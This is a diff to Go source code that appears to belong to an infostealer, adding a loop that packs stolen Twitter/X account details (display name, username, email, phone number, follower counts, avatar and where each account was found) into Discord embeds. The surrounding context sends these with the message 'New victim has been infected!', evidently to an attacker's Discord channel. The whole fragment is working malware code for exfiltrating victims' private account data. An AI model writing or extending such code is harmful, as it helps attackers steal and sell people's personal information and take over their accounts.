@@ -268,6 +268,61 @@ func SendDiscordNotification() error {
 			},
 		})
 	}
+	for _, account := range twitterResults {
+		embeds = append(embeds, DiscordEmbed{
+			Title: fmt.Sprintf("Twitter Account: %s", account.Username),
+			Fields: []DiscordEmbedField{
+				{
+					Name:   "👤 Display Name",
+					Value:  fmt.Sprintf("`%s`", account.DisplayName),
+					Inline: true,
+				},
+				{
+					Name:   "🏷️ Username",
+					Value:  fmt.Sprintf("`@%s`", account.Username),
+					Inline: true,
+				},
+				{
+					Name:   "📧 Email",
+					Value:  fmt.Sprintf("`%s`", account.Email),
+					Inline: true,
+				},
+				{
+					Name:   "📱 Phone",
+					Value:  fmt.Sprintf("`%s`", account.Phone),
+					Inline: true,
+				},
+				{
+					Name:   "📅 Created At",
+					Value:  fmt.Sprintf("<t:%d:f>", account.CreatedAt.Unix()),
+					Inline: true,
+				},
+				{
+					Name:   "👥 Followers",
+					Value:  fmt.Sprintf("`%d`", account.FollowersCount),
+					Inline: true,
+				},
+				{
+					Name:   "👤 Following",
+					Value:  fmt.Sprintf("`%d`", account.FollowingCount),
+					Inline: true,
+				},
+				{
+					Name:   "📝 Tweet Count",
+					Value:  fmt.Sprintf("`%d`", account.TweetCount),
+					Inline: true,
+				},
+			},
+			Thumbnail: &DiscordEmbedThumbnail{
+				URL: account.AvatarURL,
+			},
+			URL: fmt.Sprintf("https://x.com/%s", account.Username),
+			Footer: &DiscordEmbedFooter{
+				Text:    fmt.Sprintf("Found in: %s", account.FoundIn),
+				IconURL: "https://abs.twimg.com/favicons/twitter.ico",
+			},
+		})
+	}
 
 	message := DiscordMessage{
 		Content: "New victim has been infected!",
